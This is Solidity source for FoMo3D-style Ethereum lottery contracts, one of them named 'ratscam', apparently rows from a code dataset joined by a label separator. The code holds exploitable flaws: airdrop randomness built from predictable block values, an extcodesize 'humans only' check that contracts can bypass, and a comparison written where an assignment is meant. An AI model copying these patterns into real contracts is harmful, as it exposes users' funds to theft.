_affCode;        }                 buyCore(_pID, _affCode, _eventData_);    }    function buyXaddr(address _affCode)    isActivated()    isHuman()    isWithinLimits(msg.value)    public    payable    {                 RSdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                     } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 buyCore(_pID, _affID, _eventData_);    }    function buyXname(bytes32 _affCode)    isActivated()    isHuman()    isWithinLimits(msg.value)    public    payable    {                 RSdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                     } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 buyCore(_pID, _affID, _eventData_);    }         function reLoadXid(uint256 _affCode, uint256 _eth)    isActivated()    isHuman()    isWithinLimits(_eth)    public    {                 RSdatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                     } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 reLoadCore(_pID, _affCode, _eth, _eventData_);    }    function reLoadXaddr(address _affCode, uint256 _eth)    isActivated()    isHuman()    isWithinLimits(_eth)    public    {                 RSdatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                     } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 reLoadCore(_pID, _affID, _eth, _eventData_);    }    function reLoadXname(bytes32 _affCode, uint256 _eth)    isActivated()    isHuman()    isWithinLimits(_eth)    public    {                 RSdatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                     } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 reLoadCore(_pID, _affID, _eth, _eventData_);    }         function withdraw()    isActivated()    isHuman()    public    {                 uint256 _rID = rID_;                 uint256 _now = now;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _eth;                 if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         RSdatasets.EventReturns memory _eventData_;                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit RSEvents.onWithdrawAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eth,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.genAmount            );                     } else {                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         emit RSEvents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }         function registerNameXID(string _nameString, uint256 _affCode, bool _all)    isHuman()    public    payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = RatBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit RSEvents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXaddr(string _nameString, address _affCode, bool _all)    isHuman()    public    payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = RatBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit RSEvents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXname(string _nameString, bytes32 _affCode, bool _all)    isHuman()    public    payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = RatBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit RSEvents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }                             function getBuyPrice()    public    view    returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }         function getTimeLeft()    public    view    returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;        if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now));        else            return(0);    }         function getPlayerVaults(uint256 _pID)    public    view    returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                 if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                plyr_[_pID].aff                );                             } else {                return                (                plyr_[_pID].win,                (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                plyr_[_pID].aff                );            }                     } else {            return            (            plyr_[_pID].win,            (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),            plyr_[_pID].aff            );        }    }         function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)    private    view    returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }         function getCurrentRoundInfo()    public    view    returns(uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256)    {                 uint256 _rID = rID_;        return        (        round_[rID_].keys,                       round_[rID_].end,                        round_[rID_].strt,                       round_[rID_].pot,                        round_[rID_].plyr,                       plyr_[round_[rID_].plyr].addr,           plyr_[round_[rID_].plyr].name,           airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)    public    view    returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];        return        (        _pID,                                        plyr_[_pID].name,                            plyrRnds_[_pID][_rID].keys,                  plyr_[_pID].win,                             (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff,                             plyrRnds_[_pID][_rID].eth                    );    }                             function buyCore(uint256 _pID, uint256 _affID, RSdatasets.EventReturns memory _eventData_)    private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                         core(_rID, _pID, msg.value, _affID, _eventData_);                     } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)            {                                 round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                 emit RSEvents.onBuyAndDistribute                (                    msg.sender,                    plyr_[_pID].name,                    msg.value,                    _eventData_.compressedData,                    _eventData_.compressedIDs,                    _eventData_.winnerAddr,                    _eventData_.winnerName,                    _eventData_.amountWon,                    _eventData_.newPot,                    _eventData_.genAmount                );            }                         plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }         function reLoadCore(uint256 _pID, uint256 _affID, uint256 _eth, RSdatasets.EventReturns memory _eventData_)    private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                         core( _rID, _pID, _eth, _affID, _eventData_);                     } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit RSEvents.onReLoadAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.genAmount            );        }    }         function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, RSdatasets.EventReturns memory _eventData_)    private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                 if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 10000000000000000000)        {            uint256 _availableLimit = (10000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                 if (_eth > 1000000000)        {                         uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)            {                updateTimer(_keys, _rID);                                 if (round_[_rID].plyr != _pID)                    round_[_rID].plyr = _pID;                                 _eventData_.compressedData = _eventData_.compressedData + 100;            }                         if (_eth >= 100000000000000000)            {                airDropTracker_++;                if (airdrop() == true)                {                                         uint256 _prize;                    if (_eth >= 10000000000000000000)                    {                                                 _prize = ((airDropPot_).mul(75)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                 airDropPot_ = (airDropPot_).sub(_prize);                                                 _eventData_.compressedData += 300000000000000000000000000000000;                    } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                                 _prize = ((airDropPot_).mul(50)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                 airDropPot_ = (airDropPot_).sub(_prize);                                                 _eventData_.compressedData += 200000000000000000000000000000000;                    } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                                 _prize = ((airDropPot_).mul(25)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                 airDropPot_ = (airDropPot_).sub(_prize);                                                 _eventData_.compressedData += 100000000000000000000000000000000;                    }                                         _eventData_.compressedData += 10000000000000000000000000000000;                                         _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                         airDropTracker_ = 0;                }            }                         _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                         round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);                         endTx(_pID, _eth, _keys, _eventData_);        }    }                             function calcUnMaskedEarnings(uint256 _pID, uint256 _rID)    private    view    returns(uint256)    {        return((((round_[_rID].mask).mul(plyrRnds_[_pID][_rID].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rID].mask));    }         function calcKeysReceived(uint256 _eth)    public    view    returns(uint256)    {        uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }         function iWantXKeys(uint256 _keys)    public    view    returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }                             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)    external    {        require (msg.sender == address(RatBook), "only RatBook can call this function");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function receivePlayerNameList(uint256 _pID, bytes32 _name)    external    {        require (msg.sender == address(RatBook), "only RatBook can call this function");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function determinePID(RSdatasets.EventReturns memory _eventData_)    private    returns (RSdatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = RatBook.getPlayerID(msg.sender);            bytes32 _name = RatBook.getPlayerName(_pID);            uint256 _laff = RatBook.getPlayerLAff(_pID);                         pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;            if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }            if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                         _eventData_.compressedData = _eventData_.compressedData + 1;        }        return (_eventData_);    }         function managePlayer(uint256 _pID, RSdatasets.EventReturns memory _eventData_)    private    returns (RSdatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                 plyr_[_pID].lrnd = rID_;                 _eventData_.compressedData = _eventData_.compressedData + 10;        return(_eventData_);    }         function endRound(RSdatasets.EventReturns memory _eventData_)    private    returns (RSdatasets.EventReturns)    {                 uint256 _rID = rID_;                 uint256 _winPID = round_[_rID].plyr;                          uint256 _pot = round_[_rID].pot + airDropPot_;                          uint256 _win = (_pot.mul(45)) / 100;        uint256 _com = (_pot / 10);        uint256 _gen = (_pot.mul(potSplit_)) / 100;                 uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _com = _com.add(_dust);        }                 plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                 adminAddress.transfer(_com);                 round_[_rID].mask = _ppt.add(round_[_rID].mask);                 _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.newPot = 0;                 rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = 0;        return(_eventData_);    }         function updateGenVault(uint256 _pID, uint256 _rID)    private    {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rID);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rID].mask = _earnings.add(plyrRnds_[_pID][_rID].mask);        }    }         function updateTimer(uint256 _keys, uint256 _rID)    private    {                 uint256 _now = now;                 uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                 if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }         function airdrop()    private    view    returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(                (block.timestamp).add                (block.difficulty).add                ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add                (block.gaslimit).add                ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add                (block.number)            )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, RSdatasets.EventReturns memory _eventData_)    private    returns(RSdatasets.EventReturns)    {                 uint256 _com = _eth * 5 / 100;                 uint256 _aff = _eth / 10;                          if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit RSEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);        } else {                         _com += _aff;        }                 adminAddress.transfer(_com);        return(_eventData_);    }         function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _keys, RSdatasets.EventReturns memory _eventData_)    private    returns(RSdatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_)) / 100;                 uint256 _air = (_eth / 20);        airDropPot_ = airDropPot_.add(_air);                 uint256 _pot = (_eth.mul(20) / 100);                          uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                 round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                 _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;        return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)    private    returns(uint256)    {                          uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                          uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                 return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }         function withdrawEarnings(uint256 _pID)    private    returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                 uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }         function endTx(uint256 _pID, uint256 _eth, uint256 _keys, RSdatasets.EventReturns memory _eventData_)    private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);        emit RSEvents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }         bool public activated_ = false;    function activate()    public    {                          require(            msg.sender == adminAddress,            "only owner can activate"        );                 require(activated_ == false, "ratscam already activated");                 activated_ = true;                 rID_ = 1;        round_[1].strt = now - rndGap_;        round_[1].end = now + rndInit_;    }}    library RSdatasets {                                                                                                   struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 laff;            uint256 lrnd;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;        }    struct Round {        uint256 plyr;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;        }}    library RSKeysCalc {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)    internal    pure    returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }         function ethRec(uint256 _curKeys, uint256 _sellKeys)    internal    pure    returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)    internal    pure    returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }         function eth(uint256 _keys)    internal    pure    returns(uint256)    {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}   interface RatBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);}library NameFilter {         function nameFilter(string _input)    internal    pure    returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                 require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                 bool _hasNonNumber;                 for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                     _temp[i] == 0x20 ||                                 (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                 (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;            }        }        require(_hasNonNumber == true, "string cannot be only numbers");        bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {         function mul(uint256 a, uint256 b)    internal    pure    returns (uint256 c)    {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)    internal    pure    returns (uint256)    {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)    internal    pure    returns (uint256 c)    {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }         function sqrt(uint256 x)    internal    pure    returns (uint256 y)    {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)        {            y = z;            z = ((add((x / z),z)) / 2);        }    }         function sq(uint256 x)    internal    pure    returns (uint256)    {        return (mul(x,x));    }}
1<CODESPLIT>contract FoMo3Dlong is modularLong {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcLong for uint256;		otherFoMo3D private otherF3D_;    DiviesInterface constant private Divies = DiviesInterface(0x1a294b212BB37f790AeF81b91321A1111A177f45);    JIincForwarderInterface constant private Jekyll_Island_Inc = JIincForwarderInterface(0xdd4950F977EE28D2C132f1353D1595035Db444EE);	PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0xD60d353610D9a5Ca478769D371b53CEfAA7B6E4c);    F3DexternalSettingsInterface constant private extSettings = F3DexternalSettingsInterface(0x27AFcbe78bA41543c8e6eDe1ec0560cD128ADCCb);        string constant public name = "FoMo3D Long Official";    string constant public symbol = "F3D";	uint256 private rndExtra_ = extSettings.getLongExtra();          uint256 private rndGap_ = extSettings.getLongGap();              uint256 constant private rndInit_ = 1 hours;                     uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 24 hours;                     	uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;              constructor()        public    {		                                     		                               fees_[0] = F3Ddatasets.TeamFee(30,6);            fees_[1] = F3Ddatasets.TeamFee(43,0);            fees_[2] = F3Ddatasets.TeamFee(56,10);           fees_[3] = F3Ddatasets.TeamFee(43,8);                                      potSplit_[0] = F3Ddatasets.PotSplit(15,10);           potSplit_[1] = F3Ddatasets.PotSplit(25,0);            potSplit_[2] = F3Ddatasets.PotSplit(20,20);           potSplit_[3] = F3Ddatasets.PotSplit(30,10);   	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");         _;    }             modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;                assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;        }                 function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                             uint256 _pID = pIDxAddr_[msg.sender];                         buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }             function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affCode, _team, _eventData_);    }        function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }        function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }             function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }        function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }        function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' 